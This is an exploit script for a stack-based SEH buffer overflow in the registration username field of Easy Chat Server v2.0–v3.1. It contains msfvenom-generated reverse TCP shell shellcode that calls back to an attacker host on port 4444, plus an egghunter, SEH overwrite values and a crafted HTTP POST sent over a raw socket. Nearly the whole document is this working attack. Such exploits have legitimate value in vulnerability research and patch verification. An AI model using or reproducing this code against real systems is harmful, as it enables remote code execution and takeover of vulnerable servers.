# Exploit Title: Easy Chat Server User Registeration Buffer Overflow (SEH) - Using EggHunter Shellcode
# Exploit Author: Shivam Sawant
# Vulnerability Type: Buffer Overflow
# Vulnerable Version: v2.0 to v3.1
# Severity: Critical
# Tested on: [Windows 7 sp1 Eng]

# ======================================================================================================================
#	Username parameter in Registeration page 'register.php' is prone to a stack-based buffer-overflow vulnerability.
# Application fails to properly bounds-check user-supplied data before copying it into an insufficiently sized buffer. 
# ======================================================================================================================

# USAGE: python Overflow.py ip
# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.116.135 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0c\x0d' -i 3 -f python

#!/usr/bin/python

import os
import sys
import socket

ip = sys.argv[1]

socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

socket.connect((ip , 80))

buf =  "w00tw00t"
buf += "\xb8\xc5\x07\xa4\xc9\xdb\xdd\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x63\x31\x42\x15\x03\x42\x15\x83\xc2\x04\xe2"
buf += "\x30\xdd\x7c\x73\x1f\xa5\x74\x90\x86\x5e\xa1\x6c\x66"
buf += "\xae\x60\x3d\xcb\xe1\x24\x29\x70\xef\x35\x56\x85\xa4"
buf += "\x2f\xb8\x48\xc2\xe5\x67\xf0\x62\x73\x1e\xf4\x90\x0e"
buf += "\x7f\x3f\x5c\x24\xbb\x17\xf4\x6a\x9c\xb1\x46\xa0\x7e"
buf += "\x5a\x5e\xfa\x33\x42\xb4\x19\x5e\x33\xdb\x39\x2f\x1a"
buf += "\x1f\x68\xb2\xd7\x18\xef\xa9\x52\x01\x38\xae\x80\xeb"
buf += "\x6f\xf0\xf8\x0e\x80\x5c\x5b\x0f\x2b\x7c\xa3\xa8\x97"
buf += "\x10\x37\x83\x56\x34\x34\x36\xfb\xd5\xfd\x09\x1d\x21"
buf += "\xd7\x99\xdf\xca\x86\x81\xc6\x54\x50\xb9\x28\x21\xc8"
buf += "\x68\x50\x62\x73\xe0\xa6\xad\x14\x64\x75\xa6\x63\x9f"
buf += "\x31\xd8\x29\x04\x80\x3f\x79\x77\xeb\x9a\x03\xc4\x3a"
buf += "\xab\xac\x45\xd5\x2c\xa9\x21\x7d\x71\x30\x11\xc1\x02"
buf += "\xd4\xc9\x8c\xfb\xdb\x95\xe5\xd7\x1f\xc2\x5a\x52\x36"
buf += "\x05\x8f\x49\x27\x95\xcb\xaf\x57\x86\x98\x8a\x1c\x5c"
buf += "\x59\x0f\x87\x42\x77\x4c\x74\x02\xf6\xd3\xab\x15\xb0"
buf += "\xf7\xfc\x44\x90\x01\x65\x37\xc7\x4e\x36\x9d\x60\x2f"
buf += "\xfe\xc6\xd9\x5d\xe7\x72\x13\x02\xaf\xa1\xb3\xe0\x04"
buf += "\x56\xe4\x16\xab\x8a\x53\xef\x38\x92\x5d\x8d\xab\xf5"
buf += "\x2e\xff\xd6\x08\x72\x29\x74\x4c\x76\x72\xe3\x33\x13"
buf += "\x1a\x15\xba\x76\x34\xef\x56\x72\x2c\x24\x31\xbb\xca"
buf += "\xd2\x14\x79\xa6\x4a\x70\xa1\xb5\xc3\x85\xeb\x3c\xd5"
buf += "\x4f\x4a\xd9\x03\xa7\xcc\x5b\x95\x09\x53\xee\xb3\x1c"
buf += "\xa5\xcd\xba\x86\x10\xad\x9a\x6b\x89\x93\x62\xea\x7c"
buf += "\x49\xba\xe8\x5f\xbe\x76\x11\x3a\xf2\xbe\x3f\xca\xe9"
buf += "\x2a\x25\xf4\xde\x41\x44\x8b\x06\x4a\x4e\xa4\x89\xb7"
buf += "\x52\x16\x56\x9e\x9f\x4f\x58\xc0\xf9\xae\x5c\x2b\xa6"
buf += "\xf4\xe7\x99\x93\xf9\x2e\x60\xef\x53\x87\x36\x20\xe2"
buf += "\xee\xd9\x72\x18\x4c\x03\x38\x30\xaa\x4b\x91\xfd\x50"
buf += "\xff\x45\x37\x80\xfc\x4a\xf1\x0b\x51\xd8\xa3\x44\xcf"
buf += "\x3e\xee\x08\x35\x0f\x8b\xad\x62\xce\x45\x3f\xa3\xb8"
buf += "\x42\xaf\x92\x9a\x7f\xa0"
    
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

magic = "B" * 217
NSEH = "\xeb\x06\x90\x90"
SEH = "\x7e\x8d\x01\x10"
magic1 = buf

buffer = "POST /registresult.htm HTTP/1.1\r\n\r\n"
buffer += "Host: 192.168.1.11"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
buffer += "Accept-Language: en-US,en;q=0.5"
buffer += "Accept-Encoding: gzip, deflate"
buffer += "Referer: http://192.168.1.11/register.ghp"
buffer += "Connection: close"
buffer += "Content-Type: application/x-www-form-urlencoded"

buffer += "UserName=" + magic + NSEH + SEH + "\x90"*5 + egghunter + "\x90"*10 + magic1 + "\x90"*100 + "&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register"

socket.send(buffer)

data = socket.recv(4096)
print data
socket.close()
